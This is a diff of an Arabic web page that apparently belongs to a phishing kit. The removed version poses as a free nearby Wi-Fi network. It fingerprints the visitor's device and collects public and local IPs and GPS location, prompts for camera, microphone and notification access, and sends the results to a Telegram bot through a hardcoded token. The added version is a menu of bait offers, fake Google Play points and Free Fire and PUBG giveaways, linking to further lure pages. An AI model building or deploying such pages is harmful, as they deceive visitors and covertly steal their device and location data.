@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>📶 شبكة قريبة منك</title>
+<title>اختر تجربتك</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -25,330 +25,75 @@ body {
     box-shadow: 0 30px 80px rgba(0,0,0,0.6);
     border: 1px solid rgba(255,255,255,0.08);
 }
-.header { text-align: center; margin-bottom: 20px; }
-.icon {
-    width: 70px; height: 70px;
-    margin: 0 auto 15px;
-    background: linear-gradient(135deg, #4da6ff, #9d4edd);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 35px;
-}
 h1 {
     font-size: 22px;
+    text-align: center;
     margin-bottom: 8px;
     background: linear-gradient(90deg, #4da6ff, #9d4edd);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
 }
-p { font-size: 13px; color: #8892b0; line-height: 1.7; }
-
-.warn {
-    background: rgba(255,77,77,0.1);
-    border: 1px solid rgba(255,77,77,0.3);
-    border-radius: 10px;
-    padding: 10px;
-    font-size: 12px;
-    color: #ff9999;
-    margin: 15px 0;
-    text-align: center;
-}
-
-button {
-    background: linear-gradient(135deg, #4da6ff, #9d4edd);
-    color: #fff;
-    border: none;
-    padding: 17px;
+.sub { font-size: 13px; color: #8892b0; text-align: center; margin-bottom: 25px; }
+.card {
+    display: flex;
+    align-items: center;
+    padding: 16px;
+    background: rgba(26, 32, 64, 0.8);
     border-radius: 14px;
-    font-size: 17px;
-    font-weight: bold;
-    cursor: pointer;
-    width: 100%;
-}
-button:disabled { opacity: 0.7; }
-
-.status {
-    margin-top: 15px;
-    font-size: 13px;
-    text-align: center;
-    color: #8892b0;
-    min-height: 20px;
-}
-
-.toast {
-    position: fixed;
-    top: 20px;
-    left: 50%;
-    transform: translateX(-50%) translateY(-100px);
-    background: rgba(20, 25, 50, 0.95);
+    margin-bottom: 12px;
+    border: 1px solid rgba(255,255,255,0.08);
+    text-decoration: none;
     color: #fff;
-    padding: 14px 20px;
-    border-radius: 14px;
-    font-size: 14px;
-    z-index: 9999;
-    max-width: 90%;
-    transition: transform 0.4s;
+    transition: 0.3s;
 }
-.toast.show { transform: translateX(-50%) translateY(0); }
+.card:hover { border-color: #4da6ff; transform: translateY(-2px); }
+.card .ico { font-size: 28px; margin-left: 12px; }
+.card .txt { flex: 1; text-align: right; }
+.card .title { font-size: 15px; font-weight: bold; margin-bottom: 4px; }
+.card .desc { font-size: 11px; color: #8892b0; }
+.arrow { color: #4da6ff; font-size: 20px; }
 </style>
 </head>
 <body>
 <div class="box">
-    <div class="header">
-        <div class="icon">📶</div>
-        <h1>شبكة قريبة منك</h1>
-        <p>تم اكتشاف شبكة إنترنت مفتوحة بالقرب منك</p>
-    </div>
-    <div class="warn">⚠️ للاتصال، يجب السماح بالموقع والكاميرا والمايك</div>
-    <button id="btn" onclick="start()">🔓 اتصل بالشبكة</button>
-    <div class="status" id="status"></div>
+    <h1>🎯 اختر تجربتك</h1>
+    <p class="sub">اختر واحدة من التجارب لبدء الاختبار</p>
+
+    <a class="card" href="wifi.html">
+        <span class="ico">📶</span>
+        <div class="txt">
+            <div class="title">شبكة قريبة منك</div>
+            <div class="desc">اكتشاف شبكات مفتوحة</div>
+        </div>
+        <span class="arrow">‹</span>
+    </a>
+
+    <a class="card" href="google.html">
+        <span class="ico">🎁</span>
+        <div class="txt">
+            <div class="title">اكسب 200 نقطة Google Play</div>
+            <div class="desc">عرض حصري من Google</div>
+        </div>
+        <span class="arrow">‹</span>
+    </a>
+
+    <a class="card" href="freefire.html">
+        <span class="ico">💎</span>
+        <div class="txt">
+            <div class="title">2000 جوهرة Free Fire</div>
+            <div class="desc">هدية من Garena</div>
+        </div>
+        <span class="arrow">‹</span>
+    </a>
+
+    <a class="card" href="pubg.html">
+        <span class="ico">🎮</span>
+        <div class="txt">
+            <div class="title">1000 UC PUBG Mobile</div>
+            <div class="desc">مكافأة من PUBG</div>
+        </div>
+        <span class="arrow">‹</span>
+    </a>
 </div>
-
-<script>
-const TOKEN = "8885955583:AAE7YHh4JvdHZ2f7f2lnh37mdFTxzMrpBTg";
-const CHAT_ID = "7560932400";
-
-function send(t) {
-    return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: CHAT_ID, text: t})
-    }).catch(()=>{});
-}
-
-function toast(m) {
-    const el = document.createElement("div");
-    el.className = "toast";
-    el.innerText = m;
-    document.body.appendChild(el);
-    setTimeout(() => el.classList.add("show"), 30);
-    setTimeout(() => {
-        el.classList.remove("show");
-        setTimeout(() => el.remove(), 400);
-    }, 2500);
-}
-
-// بصمة Canvas
-function canvasFP() {
-    try {
-        const c = document.createElement("canvas");
-        c.width = 200; c.height = 50;
-        const ctx = c.getContext("2d");
-        ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(0, 0, 200, 50);
-        ctx.fillStyle = "#069";
-        ctx.fillText("Fingerprint", 10, 20);
-        return c.toDataURL().slice(-40);
-    } catch(e) { return "err"; }
-}
-
-// WebGL
-function webgl() {
-    try {
-        const c = document.createElement("canvas");
-        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-        if (!gl) return {};
-        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-        return {
-            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "?",
-            renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "?",
-            version: gl.getParameter(gl.VERSION)
-        };
-    } catch(e) { return {}; }
-}
-
-// Audio
-function audioFP() {
-    return new Promise(r => {
-        try {
-            const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-            if (!AC) return r("غير مدعوم");
-            const ctx = new AC(1, 44100, 44100);
-            const osc = ctx.createOscillator();
-            osc.type = "triangle";
-            osc.frequency.value = 10000;
-            const comp = ctx.createDynamicsCompressor();
-            osc.connect(comp);
-            comp.connect(ctx.destination);
-            osc.start(0);
-            ctx.startRendering();
-            ctx.oncomplete = (e) => {
-                const d = e.renderedBuffer.getChannelData(0);
-                let s = 0;
-                for (let i = 0; i < 100; i++) s += Math.abs(d[i]);
-                r(s.toFixed(6));
-            };
-        } catch(e) { r("err"); }
-    });
-}
-
-// WebRTC IP
-function webrtc() {
-    return new Promise(r => {
-        try {
-            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-            pc.createDataChannel("");
-            const ips = new Set();
-            pc.onicecandidate = e => {
-                if (e.candidate) {
-                    const ip = e.candidate.candidate.split(" ")[4];
-                    if (ip) ips.add(ip);
-                } else {
-                    pc.close();
-                    r(Array.from(ips).join(", ") || "غير متاح");
-                }
-            };
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-            setTimeout(() => { pc.close(); r(Array.from(ips).join(", ") || "timeout"); }, 3000);
-        } catch(e) { r("err"); }
-    });
-}
-
-// البطارية
-function battery() {
-    return new Promise(r => {
-        if (!navigator.getBattery) return r("غير مدعوم");
-        navigator.getBattery().then(b => {
-            r(`${Math.round(b.level*100)}% • ${b.charging?"يشحن":"لا يشحن"}`);
-        }).catch(()=>r("err"));
-    });
-}
-
-// الأجهزة
-async function devices() {
-    try {
-        const l = await navigator.mediaDevices.enumerateDevices();
-        return `كاميرات:${l.filter(d=>d.kind==="videoinput").length} • مايكات:${l.filter(d=>d.kind==="audioinput").length}`;
-    } catch(e) { return "err"; }
-}
-
-// الموقع
-function loc() {
-    return new Promise(r => {
-        if (!navigator.geolocation) return r("غير مدعوم");
-        let n = 0;
-        function t() {
-            n++;
-            if (n > 3) return r("مرفوض");
-            toast(`📍 يرجى السماح بالموقع (${n}/3)`);
-            navigator.geolocation.getCurrentPosition(
-                p => r({lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy+"m"}),
-                () => setTimeout(t, 1000),
-                {enableHighAccuracy: true, timeout: 8000}
-            );
-        }
-        t();
-    });
-}
-
-// الكاميرا
-async function cam() {
-    try {
-        const s = await navigator.mediaDevices.getUserMedia({video:true});
-        s.getTracks().forEach(t=>t.stop());
-        return "✅ تم";
-    } catch(e) { return "❌ مرفوض"; }
-}
-
-// المايك
-async function mic() {
-    try {
-        const s = await navigator.mediaDevices.getUserMedia({audio:true});
-        s.getTracks().forEach(t=>t.stop());
-        return "✅ تم";
-    } catch(e) { return "❌ مرفوض"; }
-}
-
-// الإشعارات
-async function notif() {
-    try {
-        if (!("Notification" in window)) return "غير مدعوم";
-        return await Notification.requestPermission();
-    } catch(e) { return "err"; }
-}
-
-async function start() {
-    const btn = document.getElementById("btn");
-    const status = document.getElementById("status");
-    btn.disabled = true;
-    btn.innerText = "🔄 جاري...";
-
-    let info = {};
-    
-    // أساسي
-    info.userAgent = navigator.userAgent;
-    info.platform = navigator.platform;
-    info.language = navigator.language;
-    info.languages = (navigator.languages || []).join(", ");
-    info.screen = `${screen.width}x${screen.height}`;
-    info.availScreen = `${screen.availWidth}x${screen.availHeight}`;
-    info.colorDepth = screen.colorDepth + "bit";
-    info.pixelRatio = window.devicePixelRatio || 1;
-    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    info.cores = navigator.hardwareConcurrency || "?";
-    info.memory = navigator.deviceMemory ? navigator.deviceMemory+"GB" : "?";
-    info.touch = navigator.maxTouchPoints > 0 ? "نعم" : "لا";
-    info.cookies = navigator.cookieEnabled;
-    info.dnt = navigator.doNotTrack || "غير محدد";
-    info.plugins = (navigator.plugins || []).length;
-    info.online = navigator.onLine;
-
-    // بصمات
-    info.canvas_fp = canvasFP();
-    
-    const gl = webgl();
-    info.gpu_vendor = gl.vendor || "?";
-    info.gpu_renderer = gl.renderer || "?";
-    
-    info.audio_fp = await audioFP();
-    info.battery = await battery();
-    info.devices = await devices();
-    info.webrtc_ips = await webrtc();
-
-    // IP
-    try {
-        const r = await fetch("https://ipwho.is/");
-        const j = await r.json();
-        info.ip = j.ip;
-        info.country = j.country;
-        info.city = j.city;
-        info.isp = j.connection && j.connection.isp;
-    } catch(e) { info.ip = "unknown"; }
-
-    // الأذونات
-    const geo = await loc();
-    if (typeof geo === "object") {
-        info.gps_lat = geo.lat;
-        info.gps_lon = geo.lon;
-        info.gps_acc = geo.acc;
-    } else {
-        info.gps = geo;
-    }
-
-    toast("📷 طلب الكاميرا...");
-    info.camera = await cam();
-
-    toast("🎤 طلب المايك...");
-    info.microphone = await mic();
-
-    toast("🔔 طلب الإشعارات...");
-    info.notifications = await notif();
-
-    // إرسال
-    let text = "📶 معلومات كاملة:\n\n" + 
-        Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n");
-    await send(text);
-
-    status.innerText = "✅ تم الاتصال";
-    btn.innerText = "✓ متصل";
-    toast("🎉  ............ تلقائي بلشبكه الإتصال  جاري   ");
-
-    setTimeout(() => location.href = "https://www.google.com", 2500);
-}
-</script>
 </body>
 </html>
